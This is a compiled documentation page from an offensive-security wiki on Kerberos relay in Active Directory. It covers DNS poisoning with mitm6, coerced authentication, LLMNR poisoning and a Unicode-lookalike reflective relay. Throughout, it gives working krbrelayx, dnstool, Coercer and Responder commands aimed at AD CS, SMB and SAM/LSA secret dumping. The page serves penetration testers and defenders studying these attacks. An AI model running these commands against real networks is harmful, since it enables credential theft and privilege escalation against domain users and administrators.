import{_ as t,o as s,c as i,ak as a}from"./chunks/framework.Cq0X4QeM.js";const k=JSON.parse('{"title":"Kerberos relay","description":"MITRE ATT&CK™ Sub-technique T1557.001","frontmatter":{"description":"MITRE ATT&CK™ Sub-technique T1557.001","authors":"BlWasp, PvUL00","category":"ad"},"headers":[],"relativePath":"ad/movement/kerberos/relay.md","filePath":"ad/movement/kerberos/relay.md"}'),n={name:"ad/movement/kerberos/relay.md"};function r(o,e,h,l,c,p){return s(),i("div",null,e[0]||(e[0]=[a(`<h1 id="kerberos-relay" tabindex="-1">Kerberos relay <a class="header-anchor" href="#kerberos-relay" aria-label="Permalink to &quot;Kerberos relay&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>Under certain conditions, an attacker can relay Kerberos authentication to targets of his choosing. Depending on the mitigations in place, he will be able to move laterally and escalate privileges within an Active Directory domain. It is essential to have a good understanding of <a href="./">the basic operation of the Kerberos protocol</a> in order to understand relay attacks on it.</p><p>The aim is to relay an <code>AP-REQ</code> message (service access request with a Service Ticket), initiated by a client for one service, to another service. However, there is one crucial prerequisite: <strong>the targeted service and client must not apply encryption or signing</strong>, as we do not possess the secret (the session key) needed to perform these operations, as in the case of an <a href="./../ntlm/relay#Session-signing">NTLM relay</a> attack.</p><p>Furthermore, an <code>AP-REQ</code> message cannot be relayed <strong>to a service running under a different identity to the one initially requested by the client</strong>. So for the attack to succeed, we need to force the client to generate an <code>AP-REQ</code> for the target host and send it to us.</p><p>In Active Directory, the <code>CLASS</code> of the SPN (HTTP, CIFS, HOST, and so on) doesn&#39;t matter most of the time. This is because Windows services only check whether they can decrypt the ST transmitted via the <code>AP-REQ</code>, but do not check the class of service for which the ST was issued. Therefore, if a single account implements different services with different classes of service, this means that an ST issued for one class of service can be used to access all the other services running under the same account&#39;s identity.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>Kerberos relay attacks are not as permissive as their NTLM versions. For the moment, only a few specific exploitation scenarios have been proven.</p><p>In particular, it is important to note that, due to stricter configuration of exchange signatures (particularly for the HTTP protocol), relays to the LDAP service are, for the time being, virtually impossible by default.</p><div class="tip custom-block"><p>For these reasons, Kerberos relay has no direct advantage over NTLM relay. Its advantage lies more in the fact that NTLM authentication can sometimes be disabled on the Active Directory domain, that the target service of the relay can only authorises Kerberos (for example, in the case of an <a href="./../adcs/unsigned-endpoints#Web-endpoint-ESC8">AD CS web enrolment service</a> that has been hardened), or that the client belongs to the <a href="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group" target="_blank" rel="noreferrer">Protected Users group</a>.</p></div><p><a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noreferrer">krbrelayx</a> (Python) and <a href="https://github.com/decoder-it/KrbRelayEx" target="_blank" rel="noreferrer">KrbRelayEx</a> (C#) are great tools for relaying Kerberos authentications. Those tools setup relay clients and relay servers waiting for incoming authentications.</p><h3 id="abuse-from-dns-poisoning" tabindex="-1">Abuse from DNS poisoning <a class="header-anchor" href="#abuse-from-dns-poisoning" aria-label="Permalink to &quot;Abuse from DNS poisoning&quot;">​</a></h3><p>Dirk-jan Mollema has demonstrated in <a href="https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6" target="_blank" rel="noreferrer">this blog post</a> that combining its <a href="https://github.com/dirkjanm/mitm6" target="_blank" rel="noreferrer">mitm6</a> (Python) and <a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noreferrer">krbrelayx</a> (Python) tools, and DNS <em>Start Of Authority</em> (<strong>SOA</strong>) requests, it is possible to poison a client and force it to send an <code>AP-REQ</code> message for an arbitrary service, which can then be relayed. The following section is a summary of his blog post, and of James Forshaw&#39;s <a href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html" target="_blank" rel="noreferrer">original article</a>.</p><blockquote><p>The DNS &#39;start of authority&#39; (SOA) record stores important information about a domain or zone such as the email address of the administrator, when the domain was last updated, and how long the server should wait between refreshes.</p><p>All DNS zones need an SOA record in order to conform to IETF standards. SOA records are also important for zone transfers.</p><p><em>(Cloudflare, <a href="https://www.cloudflare.com/learning/dns/dns-records/dns-soa-record/" target="_blank" rel="noreferrer">source</a>)</em></p></blockquote><p>An interesting service for relaying authentications is the AD CS HTTP service, which by default is vulnerable to relay attacks as it does not enforce signing with HTTP, allowing an <a href="./../adcs/unsigned-endpoints#Web-endpoint-ESC8">ESC8</a> to be exploited via Kerberos from a <a href="./../mitm-and-coerced-authentications/dhcpv6-spoofing">mitm6 DNS poisoning</a>.</p><p>DNS is used in Kerberos authentication operations in Active Directory. In particular, it is used through <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/configure-dns-dynamic-updates-windows-server-2003" target="_blank" rel="noreferrer">Secure dynamic updates</a>, which are used to keep DNS records synchronised with the IP addresses of dynamically addressed clients.</p><p>To summarise, the steps involved in such an exchange are as follows:</p><blockquote><ol><li>The client queries for the Start Of Authority (SOA) record for it’s name, which indicates which server is authoritative for the domain the client is in.</li><li>The server responds with the DNS server that is authorative, in this case the DC icorp-dc.internal.corp.</li><li>The client attempts a dynamic update on the A record with their name in the zone internal.corp.</li><li>This dynamic update is refused by the server because no authentication is provided.</li><li>The client uses a TKEY query to negotiate a secret key for authenticated queries.</li><li>The server answers with a TKEY Resource Record, which completes the authentication.</li><li>The client sends the dynamic update again, but now accompanied by a TSIG record, which is a signature using the key established in steps 5 and 6.</li><li>The server acknowledges the dynamic update. The new DNS record is now in place.</li></ol><p><em>(Dirk-jan Mollema, February 22, 2022, <a href="https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/" target="_blank" rel="noreferrer">source</a>)</em></p></blockquote><p>During the <code>TKEY</code> request, Kerberos authentication takes place via <code>AP-REQ</code> and <code>AP-REP</code> requests. It is the <code>AP-REP</code> response that contains the session key then used to sign the exchanges. By advertising itself as a DNS server on the network, one can obtain Kerberos authentication from clients wishing to update their record by intercepting their initial <code>SOA</code> request. This is what <a href="https://github.com/dirkjanm/mitm6" target="_blank" rel="noreferrer">mitm6</a> does by default.</p><p>As the DNS is usually on the domain controller, the Kerberos tickets obtained will be valid for services on the DC, the account name being the same. However, the <code>TKEY</code> request asks for the exchanges to be signed. A relay to LDAP/S is therefore impossible, as the latter will automatically set up the signature. Furthermore, as the SPN requested is <code>DNS</code>, this also limits the possibilities. However:</p><ul><li>The HTTP/S services <a href="./../adcs/unsigned-endpoints#Web-endpoint-ESC8">from AD CS</a> and <a href="./../sccm-mecm/privilege-escalation/">SCCM</a> can be very good targets as HTTP does not expect a request for a signature.</li><li>Many services are actually mapped to the <code>HOST</code> service, and this is the case with <code>DNS</code>. So any host with a <code>HOST</code> service becomes valid.</li></ul><p>Here are the steps to follow to set up a Kerberos relay using IPv6 DNS poisoning:</p><ol><li>First, configure <a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noreferrer">krbrelayx</a> (Python), specifying the AD CS host as the target, and specifying the IPv4 address of the interface connected to the network, as the interface to bind the DNS server.</li><li>Then configure <a href="https://github.com/dirkjanm/mitm6" target="_blank" rel="noreferrer">mitm6</a> (Python), using the AD CS host name as the relay target.</li><li>During the poisoning, the victim will attempt to modify its DNS record, which will be refused, and will then authenticate itself via Kerberos.</li><li>The client establishes a TCP connection with <a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noreferrer">krbrelayx</a> (Python), and sends a <code>TKEY</code> request containing the Kerberos ticket.</li><li>Authentication is then relayed to AD CS.</li></ol><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># In a first terminal, waiting for an authentication to relay</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">krbrelayx.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --target</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$ADCS_FQDN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/certsrv/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -ip</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ATTACKER_IP </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">--victim</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $TARGET_SAMNAME </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">--adcs</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --template</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Machine</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># In a second terminal, poisoning the victim</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">mitm6</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ATTACKER_IP </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-d</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $DOMAIN </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-hw</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $TARGET_FQDN </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">--relay</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ADCS_FQDN </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-v</span></span></code></pre></div><h3 id="abuse-from-a-coerced-authentication" tabindex="-1">Abuse from a coerced authentication <a class="header-anchor" href="#abuse-from-a-coerced-authentication" aria-label="Permalink to &quot;Abuse from a coerced authentication&quot;">​</a></h3><p>As demonstrated by Synacktiv in <a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx" target="_blank" rel="noreferrer">this blog post</a>, it is also possible to relay a Kerberos authentication from, and to, unsigned SMB services, when it comes <a href="./../mitm-and-coerced-authentications/">from a coercion</a>.</p><p>When an SMB client builds the SPN from the service class and its name, the <code>SecMakeSPNEx2</code> method is called, which calls the <code>CredMarshalTargetInfo</code> API function. This API takes a list of target information in a <code>CREDENTIAL_TARGET_INFORMATION</code> structure, <em>marshalizes</em> it in Base64, and appends it to the end of the actual SPN.</p><p>For the hostname <code>target</code> and the class of service <code>cifs</code>, the returned SPN will look like :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>cifs/target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA</span></span></code></pre></div><p>So, if an attacker registers the DNS record <code>target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA</code>, the client will be able to request a ticket for <code>cifs/target</code>, but will connect to <code>target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA</code>. By default, any authenticated user is allowed to create <a href="./../mitm-and-coerced-authentications/adidns-spoofing">new DNS records in the ADIDNS</a>.</p><p>In his <a href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html" target="_blank" rel="noreferrer">original article</a>, James Forshaw notes this point:</p><blockquote><p>Another issue is that the size limit of a single name in DNS is 63 characters. The minimum valid marshaled buffer is 44 characters long leaving only 19 characters for the SPN part. This is at least larger than the minimum NetBIOS name limit of 15 characters so as long as there&#39;s an SPN for that shorter name registered it should be sufficient. However if there&#39;s no short SPN name registered, then it&#39;s going to be more difficult to exploit.</p><p><em>(James Forshaw, October 20, 2021, <a href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html" target="_blank" rel="noreferrer">source</a>)</em></p></blockquote><p>It is therefore necessary to restrict the content of the <code>CREDENTIAL_TARGET_INFORMATION</code> structure as much as possible. The minimal <code>CREDENTIAL_TARGET_INFORMATION</code> structure contains <code>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA</code>.</p><ol><li>First of all, register the specific DNS record (the NetBIOS being that of <strong>the machine which is going to receive the relay</strong>, for example the PKI, and not the one which will be coerced). This can be performed with <a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py" target="_blank" rel="noreferrer">dnstool.py</a> (Python):</li></ol><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">dnstool.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DOMAIN</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\\\</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$USERNAME</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$PASSWORD</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$ATTACKER_IP</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --action</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> add</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DC_IP</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --tcp</span></span></code></pre></div><ol start="2"><li>Then, trigger an authentication coerce (with <a href="https://github.com/p0dalirius/Coercer" target="_blank" rel="noreferrer">Coercer</a>) from the target to the DNS record, and relay the authentication with <a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noreferrer">krbrelayx</a> (Python). For example, here to the <a href="./../adcs/unsigned-endpoints#Web-endpoint-ESC8">PKI HTTP endpoint</a>:</li></ol><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># In a first terminal, krbrelayx waiting for an authentication to relay</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">krbrelayx.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$CA</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/certsrv/certfnsh.asp&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --adcs</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --template</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DomainController</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -v</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$RELAYED_TARGET_SAMNAME</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># In a second terminal, coerce the victim authentication to the DNS record</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">coercer</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> coerce</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $TARGET_IP </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-l</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$USER</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$PASSWORD</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DOMAIN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span></span></code></pre></div><p>In the case where the target of the relay (<strong>the machine receiving the relay</strong>) is an unsigned SMB service, and the authentication obtained is privileged, the following command will <a href="./../credentials/dumping/sam-and-lsa-secrets">dump the SAM and the LSA secrets</a>:</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">krbrelayx.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> smb://</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$TARGET_FQDN</span></span></code></pre></div><h3 id="abuse-from-multicast-poisoning" tabindex="-1">Abuse from multicast poisoning <a class="header-anchor" href="#abuse-from-multicast-poisoning" aria-label="Permalink to &quot;Abuse from multicast poisoning&quot;">​</a></h3><p>When a web server requests Kerberos authentication, it does not use the destination URL to determine the SPN for which an ST is to be retrieved, but rather the response name of the DNS response. Nominally, these two elements should coincide. The client accesses a login URL, performs the DNS query for the server&#39;s FQDN, then performs the ST request from the DNS response, and constructs the <code>AP-REQ</code>.</p><p>However, an attacker in a Man-in-the-Middle position can poison the DNS response and indicate that the HTTP server&#39;s FQDN points to him. In this way, the victim will obtain an ST for the server, construct the <code>AP-REQ</code>, and send it to the attacker. This is the attack Synacktiv has demonstrated in <a href="https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with" target="_blank" rel="noreferrer">this article</a>.</p><div class="note custom-block"><p>Note that the technique will not work for SMB clients, because it is not possible to opportunistically respond via LLMNR to non-existent hostnames in SMB with a response name containing a <code>CREDENTIAL_TARGET_INFORMATION</code> structure. This structure is explained <a href="./relay#Abuse-from-a-coerced-authentication">in the previous section</a>.</p><blockquote><p>Another limitation is that, according to our tests, other local name resolution protocols such as mDNS and NBTNS cannot be abused to carry out the attack. Indeed, while LLMNR responses contain both the query sent by the client and the response, this is not the case of mDNS and NBTNS, which only contain responses.[...]</p><p>Because mDNS and NBTNS only contain name resolution responses, changing the answer name will actually confuse the HTTP clients, which will not be able to make the connection between the query they sent, and the modified response.</p><p><em>(Quentin Roland, January 27, 2025, <a href="https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with" target="_blank" rel="noreferrer">source</a>)</em></p></blockquote><p>Finally, most HTTP clients use the Kerberos <code>Negociate</code> package, which forces the signature to be set up. This means that even HTTP authentication cannot be relayed to LDAP.</p></div><p>Here are the different steps to perform the attack:</p><ol><li>Set up an <a href="./../mitm-and-coerced-authentications/llmnr-nbtns-mdns-spoofing">LLMNR poisoner</a>, for example with <a href="https://github.com/lgandx/Responder" target="_blank" rel="noreferrer">Responder</a> (Python).</li><li>An HTTP client fails to resolve a hostname, for any reason.</li><li>The LLMNR poisoner poisons the victim, and indicates that the hostname resolves to the attacker&#39;s machine. <strong>In the LLMNR response, the response name differs from the request and corresponds to an arbitrary relay target.</strong></li><li>The victim makes a request to the attacker&#39;s web server, which requires Kerberos authentication.</li><li>The victim requests an ST with the SPN of the relay target indicated in the LLMNR response, and sends the <code>AP-REQ</code> to the attacker&#39;s web server.</li><li>The attacker extracts the <code>AP-REQ</code> and forwards it to a service of the relay target.</li></ol><p>First, run <a href="https://github.com/lgandx/Responder" target="_blank" rel="noreferrer">Responder</a> (Python) with the <code>-N</code> option, <em>which allows to spoof the answer name returned by LLMNR responses when poisoning a client</em>:</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">python3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Responder.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -I</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $INTERFACE </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-N</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $RELAY_TARGET_NETBIOSNAME</span></span></code></pre></div><p>When a request for LLMNR resolution arrives, Responder will reply with the target indicated, pointing to the attacker machine. <a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noreferrer">krbrelayx</a> (Python) can be used to actually perform the Kerberos relay:</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">python3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> krbrelayx.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --target</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;http://$ADCS_FQDN/certsrv/&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -ip</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ATTACKER_IP </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">--adcs</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --template</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> User</span></span></code></pre></div><p>This attack can also work by forcing <a href="./../mitm-and-coerced-authentications/webclient">a WebDAV authentication</a> to a record that does not exist. The absence of a DNS record will generate an LLMNR fallback, leading to the same result.</p><h3 id="kerberos-reflective-relay" tabindex="-1">Kerberos reflective relay <a class="header-anchor" href="#kerberos-reflective-relay" aria-label="Permalink to &quot;Kerberos reflective relay&quot;">​</a></h3><p>As demonstrated by Synacktiv in <a href="https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part" target="_blank" rel="noreferrer">this blog post</a>, CVE-2025-58726 and CVE-2026-26128 (both <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-26128" target="_blank" rel="noreferrer">patched March 2026</a>) extend the <a href="./../ntlm/relay#ntlm-reflective-relay">NTLM reflective relay</a> chain to Kerberos by exploiting <strong>Unicode character normalization inconsistencies</strong> across Windows components.</p><p>Registering a DNS record with lookalike Unicode characters (e.g. <code>SⓇV1․AD․LOCAL</code> where <code>Ⓡ</code> = U+24C7 CIRCLED LATIN CAPITAL LETTER R and <code>․</code> = U+2024 ONE DOT LEADER) creates a hostname that:</p><ul><li>The DC&#39;s LDAP search normalizes to match the target machine&#39;s legitimate SPN via <code>LCMapStringEx</code> (with <code>NORM_IGNORECASE | NORM_IGNORENONSPACE | NORM_IGNOREWIDTH</code>): the spoofed and legitimate names produce the same sort key</li><li>The <code>DnsCache</code> service does <strong>not</strong> recognize as localhost: <code>CompareStringW</code> uses only <code>NORM_IGNORECASE</code> and fails to equate the Unicode lookalikes, allowing DNS resolution toward the attacker</li></ul><p>The coerced machine thus requests a Kerberos ticket for the spoofed SPN, producing an AP-REQ that can be intercepted and relayed back to the originating machine via a modified <a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noreferrer">krbrelayx.py</a>.</p><div class="note custom-block"><p>Even after the March 2026 patch (which enforces SMB signing for loopback connections via the <code>RequireSecuritySignatureForLoopback</code> registry key), services that do not enforce channel binding remain vulnerable: <strong><a href="./../adcs/unsigned-endpoints#Web-endpoint-ESC8">ADCS Web Enrollment</a></strong>, <strong>SCCM AdminService</strong>, and <strong>MSSQL</strong>.</p></div><ol><li>A Unicode DNS record is registered, pointing to the attacker&#39;s IP. The Unicode lookalike pattern is applied to the target NetBIOS name (e.g. <code>SⓇV1</code> for <code>SRV1</code>), with <code>Ⓡ</code> (U+24C7) as the lookalike letter and <code>․</code> (U+2024) as domain separators:</li></ol><div class="note custom-block"><p>For a machine <code>SRV1</code> in domain <code>AD.LOCAL</code>, the DNS record to register would be <code>SⓇV1․AD․LOCAL</code>.</p></div><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">dnstool.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DOMAIN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\\\</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$USER</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$PASSWORD</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DC_IP</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --action</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> add</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$ATTACKER_IP</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span></span></code></pre></div><ol start="2"><li>A modified <code>krbrelayx.py</code> is then started to relay the Kerberos AP-REQ, and an authentication coercion forces the target toward the Unicode FQDN:</li></ol><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># In a first terminal, krbrelayx relaying the AP-REQ to the target</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">krbrelayx.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> smb://&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$TARGET_FQDN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Authentication coercion toward the Unicode FQDN (e.g. with PetitPotam):</span></span>
